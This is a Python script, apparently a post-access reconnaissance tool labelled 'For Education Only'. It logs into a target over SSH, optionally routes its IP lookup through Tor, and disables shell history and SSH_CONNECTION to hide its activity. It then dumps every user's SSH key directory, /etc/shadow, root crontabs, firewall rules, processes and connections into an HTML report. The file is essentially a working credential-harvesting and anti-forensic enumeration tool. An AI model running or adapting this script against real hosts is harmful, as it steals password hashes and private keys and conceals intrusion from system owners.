#!/usr/bin/python3

import sys
import requests
from termcolor import colored
import os
from time import sleep
import warnings
warnings.filterwarnings(action='ignore', module='paramiko\.*')
import paramiko
from datetime import datetime

def banner():
    print(colored('''                                              
 ___ _   _ _ ____   _____ _   _  
/ __| | | | '__\ \ / / _ \ | | | 
\__ \ |_| | |   \ V /  __/ |_| |
|___/\__,_|_|    \_/ \___|\__, |
                           __/ | 
                          |___/ 
    ''', 'cyan', attrs=['bold']))
    print(colored("For Education Only", attrs=['bold']) + '\n')

def get_tor_session():
    session = requests.session()
    session.proxies = {'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'}
    return session

def geo_lookup():
    if host.split(".")[0] == '192' and host.split(".")[1] == '168' or host.split(".")[0] == '10' or host.split(".")[0] == '172' and host.split(".")[1] >= '16' and host.split(".")[1] <= '32' or host.split(".")[0] == '127':
        print(colored("Provided target is a private address...skipping: ", attrs=['bold']))
    else:
        user_choice = input("Do you want to proxy the Geo check through TOR?: (Y/N)")
        user_choice = user_choice.upper()
        if user_choice == "Y" or user_choice == "YES":
            auto = input("Is TOR already running?: (Y/N) ")
            auto = auto.upper()
            if auto == "Y" or auto == "YES":
                session = get_tor_session()
                try:
                    r = session.get("https://ipinfo.io/" + host) 
                    print('\n' + colored("Target IP", 'red', attrs=['bold']))
                    print(r.text)
                except:
                    raise Exception(colored("Error conducting Geo check, continuing...", 'red', attrs=['bold']))
            else:
                print(colored("Dusting off TOR and starting a session...", 'red', attrs=['blink']))
                os.system("tor &")
                sleep(15)  
                session = get_tor_session()
                try:
                    r = session.get("https://ipinfo.io/" + host) 
                    print('\n' + colored("Target IP", 'red', attrs=['bold']))
                    print(r.text)
                except:
                    raise Exception(colored("Error conducting Geo check, continuing...", 'red', attrs=['bold']))
        else:    
            print("Geo Lookup for target IP Address")
            r = requests.get('https://ipinfo.io/' + host)
            print('\n' + colored("Target IP", 'red', attrs=['bold']))
            print(r.text + '\n')

def survey():
    ssh = paramiko.SSHClient()
    ssh.load_system_host_keys()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if auth == "P":
        ssh.connect(host, port, timeout=5, username=user, password=passw)
    else:
        ssh.connect(host, port, timeout=5, username=user, key_filename=key)
    old_stdout = sys.stdout
    log_file = open('masq.log', 'w')
    sys.stdout = log_file
    paramiko.util.log_to_file('debug.log')
    print("<a href='#Logged_in_users'>Logged in Users</a> / <a href='#Dates'>Dates</a> / <a href='#Whoami'>Whoami</a> / <a href='#OS_info'>OS Info</a> / <a href='#uptime'>Uptime</a> / <a href='#kernel_information'>Kernel Information</a> / <a href='#Interfaces'>Interfaces and Neighbors</a>")
    print("<a href='#finds'>Finds</a> / <a href='#home_dirs'>Home Directory Walks</a> / <a href='#ssh_keys'>SSH Keys</a> / <a href='#passwd_shadow'>Passwd/Shadow</a> / <a href='#users_w_shell'>Users with Shell</a>")
    print("<a href='#deleted_binaries'>Deleted Binaries</a> / <a href='#process_list'>Process List</a> / <a href='#connections'>Connections</a> / <a href='#firewall_filter'>Firewall Filter Table</a> / <a href='#firewall_nat'>Firewall NAT Table</a>")
    print("<a href='#syslog'>Syslog</a> / <a href='#syslogd'>Syslogd</a> / <a href='#default_syslog'>Default Syslog File</a> / <a href='#crontabs'>Crontabs</a> / <a href='#root_crontab'>Root Crontab</a> / <a href='#dmesg'>Dmesg</a> / <a href='#logging'>Logging</a>")
    stdin, stdout, stderr = ssh.exec_command("unset HISTFILE")
    print("<strong>########## HISTFILE unset ##########</strong>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("who")
    print("<a id='Logged_in_users'><strong>########## Logged in users ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("date; date -u")
    print("<a id='Dates'><strong>########## Dates ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("unset SSH_CONNECTION")
    print("<strong>########## SSH_CONNECTION unset ##########</strong>") 
    for line in stdout.readlines():
        print(line.strip('\n'))
   
    stdin, stdout, stderr = ssh.exec_command("whoami; id; pwd")
    print("<a id='Whoami'><strong>########## Whoami, Permissions, Where am i ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("cat /etc/os-release")
    print("<a id='OS_info'><strong>########## OS Info ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("uptime")
    print("<a id='uptime'><strong>########## Uptime ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("uname -a")
    print("<a id='kernel_information'><strong>########## Kernel Information ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("arp -a; ip a || ifconfig")
    print("<a id='Interfaces'><strong>########## Interfaces, Neighbors ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("ls -lartF / /root /var/tmp /opt /bin /sbin /usr/bin /usr/sbin .")
    print("<a id='finds'><strong>########## Finds... ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))
    
    stdin, stdout, stderr = ssh.exec_command("ls -lartF ls /home/*; ls -lartF /home/*/*; ls -lartF /home/*/*/*")
    print("<a id='home_dirs'><strong>########## User's Home Directories ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))
        
    stdin, stdout, stderr = ssh.exec_command("for i in $(ls /home); do cat /home/$i/.ssh/*; done")
    print("<a id='ssh_keys'><strong>########## SSH Keys ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))
        
    stdin, stdout, stderr = ssh.exec_command("cat /etc/passwd; cat /etc/shadow")
    print("<a id='passwd_shadow'><strong>########## passwd/shadow ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))
    
    stdin, stdout, stderr = ssh.exec_command("cat /etc/passwd | grep -E 'sh$'")
    print("<a id='users_w_shell'><strong>########## Users with Shell ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))
    
    stdin, stdout, stderr = ssh.exec_command("la -latrF /proc/[0-9]*/exe 2>/dev/null | egrep 'deleted|removed|dev|tmp|run'")
    print("<a id='deleted_binaries'><strong>########## Deleted Binary Search ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))
    
    stdin, stdout, stderr = ssh.exec_command('ps -elf')
    print("<a id='process_list'><strong>########## Process list ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("netstat -antpu || ss -tulwn")
    print("<a id='connections'><strong>########## Connections ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("iptables -t filter -nvL")
    print("<a id='firewall_filter'><strong>########## Firewall Filter Table ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("iptables -t nat -nvL")
    print("<a id='firewall_nat'><strong>########## Firewall Nat Table ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("ls -lartF /etc/*/*syslog*")
    print("<a id='syslog'><strong>########## Syslog stuff ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))
   
    stdin, stdout, stderr = ssh.exec_command("cat /etc/config/syslogd")
    print("<a id='syslogd'><strong>########## Syslogd Config ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))
        
    stdin, stdout, stderr = ssh.exec_command("cat /etc/config-default/syslogd")
    print("<a id='default_syslog'><strong>########## Config-Default Syslogd ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("ls -la /var/spool/cron/crontabs")
    print("<a id='crontabs'><strong>########## Crontabs ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("cat /var/spool/cron/crontabs/root")
    print("<a id='root_crontab'><strong>########## Root Crontab ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("dmesg | tail -50")
    print("<a id='dmesg'><strong>########## Last 50 Dmesg Entries ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    stdin, stdout, stderr = ssh.exec_command("ls -lartF /var/log")
    print("<a id='logging'><strong>########## Logging in /var/log ##########</strong></a>")
    for line in stdout.readlines():
        print(line.strip('\n'))

    sys.stdout = log_file
    sys.stdout = old_stdout
    now_end = datetime.now()
    end = now_end.strftime("%m/%d/%Y, %H:%M:%S")
    print(colored("Ending survey at: ", 'blue', attrs=['bold'])) 
    print("   " + str(end))
    log_file.close()
    process_file()
    process_debug()
    print(colored('############################################################', 'green', attrs=['bold']))
    print(colored("Please see masq.html ~ survey command output", 'white', attrs=['bold']))
    print(colored("Please see debug.html ~ paramiko log", 'white', attrs=['bold']))    
            
def do_survey():
    now = datetime.now()
    start = now.strftime("%m/%d/%Y, %H:%M:%S") 
    print(colored('############################################################', 'green', attrs=['bold']))
    print(colored("Starting survey at: ", 'blue', attrs=['bold']))
    print("   " + str(start))
    if auth == "P":
        try:
            survey()
        except paramiko.ssh_exception.AuthenticationException as e:
            print(colored('[!] Authentication Failed', 'red', attrs=['bold']))
        except paramiko.ssh_exception.NoValidConnectionsError as e:
            print(colored('[!] Username does not exist', 'red', attrs=['bold']))
        except Exception as e:
            print("[!] Caught Exception: %s: %s" % (e.__class__, e))
    else:
        try:
            survey()
        except:
            raise Exception(colored('Authentication Failed', 'red', attrs=['bold']))
    
    
def process_file():
    now = datetime.now()
    date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
    html_template_start = """<html
    <head>
    <title>Survey Results</title>
    <style>
    body {background-color: LightSteelBlue;}
    </style>
    </head>
    <body>
    <h2>Survey Results</h2>
    """
    html_template_end = """</body>
    </html>
    """
    contents = open('masq.log', 'r')
    with open('masq.html', 'w') as e:
        e.write(html_template_start)
        e.write("<p>Date: " + date_time + "</p>")
        for line in contents.readlines():
            e.write("<pre>" + line.strip('\n') + "</pre>")
        e.write(html_template_end)
    os.remove('masq.log')

def process_debug():
    html_template_start = """<html
    <head>
    <title>Paramiko Debug Log</title>
    <style>
    body {background-color: LightSteelBlue;}
    </style>
    </head>
    <body>
    <h2>Paramiko Debug Log</h2>
    """
    html_template_end = """</body>
    </html>
    """
    contents = open('debug.log', 'r')
    with open('debug.html', 'w') as e:
        e.write(html_template_start)
        for line in contents.readlines():
            e.write("<pre>" + line.strip('\n') + "</pre>")
        e.write(html_template_end)
    os.remove('debug.log')


###############################################################################################################
banner()

start = True
while start == True:
    auth = input(colored("Do you want to auth with a key or a password?: (K/P) ", attrs=['bold']))
    auth = auth.upper()
    if auth == "P" or auth == "PASSWORD":
        start = False
    elif auth == "K" or auth == "KEY":
        start = False
    else:
        print("Not a valid option: ")

smart_user = False
while smart_user == False:

    if auth == "P": 
        host = input(colored("Enter IP Address: ", attrs=['bold']))
        port = int(input(colored("Enter SSH Port: ", attrs=['bold'])))
        user = input(colored("Enter Username: ", attrs=['bold']))
        passw = input(colored("Enter Password: ", attrs=['bold']))
        print(colored('############################################################', 'green', attrs=['bold']))
        print(colored("[!] IP Address: ", 'red', attrs=['bold']))
        print("   " + host)
        print(colored("[!] SSH Port: ", 'red', attrs=['bold']))
        print("   " + str(port))
        print(colored("[!] Username: ", 'red', attrs=['bold']))
        print("   " + user)
        print(colored("[!] Password: ", 'red', attrs=['bold']))
        print("   " + passw)
        print(colored('############################################################', 'green', attrs=['bold']))
        user_choice = input(colored("Does this all look good?: (Y/N) ", attrs=['bold']))
        user_choice = user_choice.upper()
        if user_choice == "Y" or user_choice == "Yes":
            smart_user = True
            geo_lookup()
            do_survey()
       
    else:
        host = input(colored("Enter IP Address: ", attrs=['bold']))
        port = int(input(colored("Enter SSH Port: ", attrs=['bold'])))
        user = input(colored("Enter Username: ", attrs=['bold']))
        key = input(colored("Enter absolute path to key file: ", attrs=['bold']))
        print(colored('############################################################', 'green', attrs=['bold']))
        print(colored("[!] IP Address: ", 'red', attrs=['bold']))
        print("   " + host)
        print(colored("[!] SSH Port: ", 'red', attrs=['bold']))
        print("   " + str(port))
        print(colored("[!] Username: ", 'red', attrs=['bold']))
        print("   " + user)
        print(colored("[!] Key Path: ", 'red', attrs=['bold']))
        print("   " + key)
        print(colored('############################################################', 'green', attrs=['bold']))
        user_choice = input(colored("Does this all look good?: (Y/N) ", attrs=['bold']))
        user_choice = user_choice.upper()
        if user_choice == "Y" or user_choice == "Yes":
            smart_user = True
            geo_lookup()
            do_survey()






